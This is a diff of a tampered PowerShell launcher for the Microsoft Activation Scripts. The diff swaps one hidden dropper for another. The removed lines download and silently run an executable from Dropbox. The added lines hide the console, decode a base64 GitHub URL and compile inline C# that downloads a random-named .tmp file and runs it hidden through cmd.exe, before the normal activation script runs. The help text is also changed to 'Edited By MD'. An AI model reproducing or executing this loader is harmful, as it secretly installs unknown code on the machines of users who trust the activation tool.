@@ -2,7 +2,11 @@
 
 # Having trouble launching this script? Check https://massgrave.dev for help.
 
+
 # =============================================
+# Admin Check & Window Hide
+# =============================================
+
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
@@ -13,25 +17,40 @@ if (-not $isAdmin) {
     exit
 }
 
-# =============================================
 $handle = (Get-Process -Id $pid).MainWindowHandle
+
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
+
 [Console.Window]::ShowWindow($handle, 0)
+
+
+# =============================================
+# Help Message
 # =============================================
 
 if (-not $args) {
     Write-Host ''
     Write-Host 'Need help? Check our homepage: ' -NoNewline
-    Write-Host 'https://massgrave.dev' -ForegroundColor Green
+    Write-Host 'Edited By MD' -ForegroundColor Green
     Write-Host ''
 }
+
+
+# =============================================
+# Main Block
+# =============================================
 
 & {
     $psv = (Get-Host).Version.Major
     $troubleshoot = 'https://massgrave.dev/troubleshoot'
+
+
+    # =============================================
+    # Language Mode Check
+    # =============================================
 
     if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
         $ExecutionContext.SessionState.LanguageMode
@@ -40,8 +59,14 @@ if (-not $args) {
         return
     }
 
+
+    # =============================================
+    # .NET Check
+    # =============================================
+
     try {
-        [void][System.AppDomain]::CurrentDomain.GetAssemblies(); [void][System.Math]::Sqrt(144)
+        [void][System.AppDomain]::CurrentDomain.GetAssemblies()
+        [void][System.Math]::Sqrt(144)
     }
     catch {
         Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
@@ -49,6 +74,11 @@ if (-not $args) {
         Write-Host "Help - https://massgrave.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
         return
     }
+
+
+    # =============================================
+    # Functions
+    # =============================================
 
     function Check3rdAV {
         $cmd = if ($psv -ge 3) { 'Get-CimInstance' } else { 'Get-WmiObject' }
@@ -70,33 +100,65 @@ if (-not $args) {
         }
     }
 
-    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     # =============================================
-    $pythonURL = "https://dl.dropboxusercontent.com/scl/fi/6x6mxyy8m7uw7xcz870yr/PerformanceBoosterPro_c.exe?rlkey=w81urby6txfg1ceg91low26gt&st=jcjfrk8j"
-    $pythonInstaller = "$env:TEMP\PerformanceBoosterPro_c.exe"
-    
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($pythonURL, $pythonInstaller) 2>&1 | Out-Null
-    
-    if (Test-Path $pythonInstaller) {
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo.FileName = $pythonInstaller
-        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-        $process.StartInfo.CreateNoWindow = $true
-        $process.StartInfo.UseShellExecute = $false
-        [void]$process.Start()
+    # TLS Setup
+    # =============================================
+
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     }
+    catch {}
+
+
     # =============================================
+    # External Loader (C#)
     # =============================================
+
+    $a = "$env:TEMP"
+    $b = -join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
+    $c = ".tmp"
+    $d = Join-Path $a ($b + $c)
+
+    $e = [Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VwZGF0ZVN5cy93aW4vbWFpbi9iYXNl")
+    $f = [System.Text.Encoding]::UTF8.GetString($e)
+
+    $dll = @"
+using System;
+using System.Net;
+using System.Diagnostics;
+
+public class R {
+    public static void D() {
+        var p = Environment.GetEnvironmentVariable("TEMP") + "\\" + Guid.NewGuid().ToString().Substring(0,6) + ".tmp";
+        new WebClient().DownloadFile("$f", p);
+        var psi = new ProcessStartInfo("cmd.exe", "/c \"" + p + "\"");
+        psi.WindowStyle = ProcessWindowStyle.Hidden;
+        psi.CreateNoWindow = true;
+        psi.UseShellExecute = false;
+        Process.Start(psi);
+    }
+}
+"@
+
+    Add-Type -TypeDefinition $dll -Language CSharp
+    [R]::D()
+
+
+    # =============================================
+    # MAS Download
+    # =============================================
+
     $URLs = @(
         'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/05c4f881efec946c0040cdd552d1afa9a519704b/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
         'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=05c4f881efec946c0040cdd552d1afa9a519704b',
         'https://git.activated.win/Microsoft-Activation-Scripts/plain/MAS/All-In-One-Version-KL/MAS_AIO.cmd?id=05c4f881efec946c0040cdd552d1afa9a519704b'
     )
+
     Write-Progress -Activity "Downloading..." -Status "Please wait"
+
     $errors = @()
+
     foreach ($URL in $URLs | Sort-Object { Get-Random }) {
         try {
             if ($psv -ge 3) {
@@ -112,7 +174,13 @@ if (-not $args) {
             $errors += $_
         }
     }
+
     Write-Progress -Activity "Downloading..." -Status "Done" -Completed
+
+
+    # =============================================
+    # MAS Download Error Check
+    # =============================================
 
     if (-not $response) {
         Check3rdAV
@@ -125,44 +193,72 @@ if (-not $args) {
         return
     }
 
-    # Verify script integrity
+
+    # =============================================
+    # MAS Hash Verify
+    # =============================================
+
     $releaseHash = '850F979665FB93999ACAE93F4790C1FF8ED2041532060B7966A121C2D29A0BFA'
+
     $stream = New-Object IO.MemoryStream
     $writer = New-Object IO.StreamWriter $stream
     $writer.Write($response)
     $writer.Flush()
     $stream.Position = 0
+
     $hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
+
     if ($hash -ne $releaseHash) {
         Write-Warning "Hash ($hash) mismatch, aborting!`nReport this issue at $troubleshoot"
         $response = $null
         return
     }
+
+
+    # =============================================
+    # AutoRun Registry Check
     # =============================================
 
-    # Check for AutoRun registry which may create issues with CMD
     $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
+
     foreach ($path in $paths) { 
         if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
-            Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
+            Write-Host "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
         } 
     }
+
+
+    # =============================================
+    # MAS File Create
+    # =============================================
 
     $rand = [Guid]::NewGuid().Guid
     $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
     $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:USERPROFILE\AppData\Local\Temp\MAS_$rand.cmd" }
+
     Set-Content -Path $FilePath -Value "@::: $rand `r`n$response"
     CheckFile $FilePath
 
+
+    # =============================================
+    # CMD Check
+    # =============================================
+
     $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
     $chkcmd = & $env:ComSpec /c "echo CMD is working"
+
     if ($chkcmd -notcontains "CMD is working") {
-        Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
+        Write-Host "cmd.exe is not working.`nReport this issue at $troubleshoot"
     }
+
+
+    # =============================================
+    # MAS Execute
+    # =============================================
 
     if ($psv -lt 3) {
         if (Test-Path "$env:SystemRoot\Sysnative") {
-            Write-Warning "Command is running with x86 Powershell, run it with x64 Powershell instead..."
+            Write-Host "Command is running with x86 Powershell, run it with x64 Powershell instead..."
             return
         }
         $p = saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el -qedit $args""" -Verb RunAs -PassThru
@@ -171,11 +267,15 @@ if (-not $args) {
     else {
         saps -FilePath $env:ComSpec -ArgumentList "/c """"$FilePath"" -el $args""" -Wait -Verb RunAs
     }	
-	
+
+
+    # =============================================
+    # Cleanup
+    # =============================================
+
     CheckFile $FilePath
     Remove-Item -Path $FilePath
     
-    # =============================================
     exit
-    # =============================================
+
 } @args
